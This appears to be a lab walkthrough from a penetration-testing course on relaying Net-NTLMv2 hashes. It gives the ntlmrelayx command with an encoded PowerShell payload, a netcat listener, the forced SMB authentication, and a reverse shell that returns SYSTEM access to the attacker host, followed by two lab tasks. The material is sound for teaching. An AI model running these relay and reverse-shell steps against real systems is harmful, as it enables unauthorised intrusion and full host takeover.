# Relaying Net-NTLMv2

Starting ntlmrelayx for a Relay-attack targeting FILES02
>``` shell
>kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
>
># ========== Expected Result ==========
>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
>...
>[*] Protocol Client SMB loaded..
>[*] Protocol Client IMAPS loaded..
>[*] Protocol Client IMAP loaded..
>[*] Protocol Client HTTP loaded..
>[*] Protocol Client HTTPS loaded..
>[*] Running in relay mode to single host
>[*] Setting up SMB Server
>[*] Setting up WCF Server
>[*] Setting up RAW Server on port 6666
>
>[*] Servers started, waiting for connections
># =====================================
>```

Starting a Netcat listener on port 8080
>``` shell
>kali@kali:~$ nc -nvlp 8080 
>
># ========== Expected Result ==========
>listening on [any] 8080 ...
># =====================================
>```

Using the dir command to create an SMB connection to our Kali machine
>``` shell
>kali@kali:~$  nc 192.168.50.211 5555
>
># ========== Expected Result ==========
>Microsoft Windows [Version 10.0.20348.707]
>(c) Microsoft Corporation. All rights reserved.
># =====================================
>
>C:\Windows\system32>whoami
>
># ========== Expected Result ==========
>whoami
>files01\files02admin
># =====================================
>
>C:\Windows\system32>dir \\192.168.119.2\test
>
># ========== Expected Result ==========
>...
># =====================================
>```

Relay-attack to execute the reverse shell on FILES02
>``` shell
>[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
>[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
>[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
>...
>[*] Executed specified command on host: 192.168.50.212
>```

Incoming reverse shell
>``` shell
>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
>whoami
>
># ========== Expected Result ==========
>nt authority\system
># =====================================
>
>PS C:\Windows\system32> hostname
>
># ========== Expected Result ==========
>FILES02
># =====================================
>
>PS C:\Windows\system32> ipconfig
>
># ========== Expected Result ==========
>Windows IP Configuration
>
>
>Ethernet adapter Ethernet0:
>
>   Connection-specific DNS Suffix  . : 
>   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
>   IPv4 Address. . . . . . . . . . . : 192.168.50.212
>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
>   Default Gateway . . . . . . . . . : 192.168.50.254
># =====================================
>```

Lab 1 - Use the methods from this section to get access to VM #2 (FILES02) of VM Group 1 and obtain the flag on the files02admin user's desktop. If the bind shell on VM #1 is terminated, it may take up to 1 minute until it is accessible again.
>``` shell
>
>```
>

Lab 2 -     Capstone Lab: Start VM Group 2 and find a way to obtain a Net-NTLMv2 hash from the anastasia user via the web application on VM #3 (BRUTE2) and relay it to VM #4 (FILES02). The flag is on anastasia's Desktop.
>``` shell
>
>```
>
